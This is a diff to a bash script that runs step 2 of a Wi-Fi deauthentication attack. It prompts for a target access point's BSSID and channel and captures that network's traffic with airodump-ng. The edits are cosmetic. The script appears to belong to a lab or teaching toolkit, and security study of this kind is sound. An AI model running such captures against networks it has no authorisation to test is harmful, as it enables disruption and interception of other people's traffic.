@@ -1,5 +1,5 @@
 #!/bin/bash
-# Perform a simulation of a Wi-Fi deauthentication attack using aircrack-ng
+# Deauthentication Attack Step 2: Capture data traffic from a WAP into file
 # Dependencies:
 # - https://github.com/aircrack-ng/aircrack-ng
 # - https://git.kernel.org/pub/scm/linux/kernel/git/jberg/iw.git
@@ -18,7 +18,7 @@ echo -e "${YELLOW}=== Perform Deauthentication Attack Step 2: Capture ===${NORMA
 # Three terminal windows are required for the attack, notify the user
 echo -e "Three terminal windows are ${BOLD}required${NORMAL} to perform the deauthentication attack:"
 echo -e "1. Display the WAP that will be attacked"
-echo -e "${GREEN}${BOLD}2. Capture data from the WAP into a file${NORMAL}"
+echo -e "${GREEN}${BOLD}2. Capture data traffic from the WAP into a file${NORMAL}"
 echo -e "3. Perform the deauthentication attack"
 echo -e
 
@@ -44,14 +44,14 @@ INTERFACE_NAME_MONITOR="${WIFI_INTERFACES[${INTERFACE_I} - 1]}"
 # Ask user to enter BSSID & CH value of the WAP they wish to attack
 read -rp "Enter BSSID of WAP to attack (MAC Address, e.g. AA:BB:CC:11:22:33): " BSSID
 read -rp "Enter CH (Channel) of WAP to attack (1-165): " CHANNEL
-
-# Ask user to enter the file prefix of the file for data capture
-read -rp "Enter file prefix for data capture: " FILE_PREFIX
 echo -e
 
+# TODO: Ask user for path to save data capture files
+# Ask user to enter the file prefix of the file for data capture
+read -rp "Enter file prefix for data capture: " FILE_PREFIX
 # Capture data from the specified WAP on a specific channel
 echo -e "Capturing data from ${BOLD}${BSSID}${NORMAL} on channel ${BOLD}${CHANNEL}${NORMAL} using monitor ${BOLD}${INTERFACE_NAME_MONITOR}${NORMAL}"
 echo -e "Data will be stored in the file ${BOLD}${FILE_PREFIX}-01.*${NORMAL}"
+echo -e "Use ${BOLD}Wireshark${NORMAL} to view the data. Open file using a file explorer or the command ${GREEN}wireshark ${FILE_PREFIX}-01.cap${NORMAL}."
 read -n 1 -s -r -p "Press any key to continue..."
-echo -e
 sudo airodump-ng -w "${FILE_PREFIX}" -c "${CHANNEL}" -d "${BSSID}" "${INTERFACE_NAME_MONITOR}"
